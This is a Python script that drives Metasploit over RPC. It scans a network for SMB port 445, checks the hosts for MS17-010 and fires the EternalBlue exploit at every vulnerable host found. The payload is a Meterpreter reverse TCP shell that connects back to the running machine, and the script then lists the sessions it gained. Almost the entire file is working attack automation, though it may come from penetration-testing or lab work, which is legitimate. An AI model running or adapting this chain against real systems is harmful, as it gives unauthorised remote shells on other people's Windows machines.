from metasploit_script import *
from json_data_processing_script import *

import pdb
import socket


def script_automate_scan():
    '''

    @return: json data from the metasploit console, the rpc client and the console associated to this client
    '''
    # check opened port
    opened_vuln_port, ip_vuln = look_for_port()
    # print(opened_vuln_port)

    # test with putting an unexploitable
    # ip_vuln.append(('172.16.1.1','445'))
    # print(ip_vuln)

    # launch metasploit
    client, console = main_connection()
    # print(client)

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    #######################################CHECK OPENED PORT####################################
    if '445' in opened_vuln_port:
        auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
        exploit_name = 'windows/smb/ms17_010_eternalblue'

        ######################################GET IP VULN FOR 445###############################

        vuln_ip_445 = look_for_ip_associated_port(ip_vuln, '445')
        # print(vuln_ip_445)

        ######################################AUXILIARY SCAN####################################
        data_read_out = []
        for ip in vuln_ip_445:
            data_console = main_enter_console_for_scan(auxiliary_scan, ip, console)
            # pdb.set_trace()
            if data_console != -1:
                if ' Host is likely VULNERABLE to MS17-010!' in data_console['data']:
                    data_read_out.append('ip : ' + str(ip) + ' ; ' + ' Host is likely VULNERABLE to '+ exploit_name)
        return data_read_out, client, console


def script_automate_exploit(data_read_out, client, console):
    '''

    @param data_read_out: json data from the metasploit console
    @param client: client rpc
    @param console: console associated to the client rpc
    @return: rpc client with the created sessions for this client
    '''
    # check opened port
    opened_vuln_port, ip_vuln = look_for_port()
    ip_vuln_reconf=[]
    # print(opened_vuln_port)

    # test with putting an unexploitable
    # ip_vuln.append(('172.16.1.1','445'))
    # print(ip_vuln)

    # print(client)

    ####################################GET IP HOSTNAME#########################################
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    hostname = s.getsockname()[0]
    s.close()

    for data in data_read_out:
     for ip in ip_vuln:
         if ip[0] in data and ip[0] not in ip_vuln_reconf:
             ip_vuln_reconf.append(ip[0])

    #######################################CONFIG EXPLOIT####################################
    auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
    exploit_name = 'windows/smb/ms17_010_eternalblue'

    #####################################GET EXPLOIT########################################

    exploit = main_run_exploit(exploit_name, client)

    #######################################CONFIG OPTIONS AND PAYLOAD#######################

    #pdb.set_trace()
    running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)

    payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
    running_config_payload = main_config_payload('LHOST', hostname, 'STR', payload)

    for ip in ip_vuln_reconf:
        # print(ip)
        main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
        json, session_create = main_exe_exploit(payload, exploit, client)

    print(client.sessions.list)
    sessions_created = client.sessions.list
    return client, sessions_created




# data, client, console = script_automate_scan()
# print(data, client, console)
#
# script_automate_exploit(data, client, console)
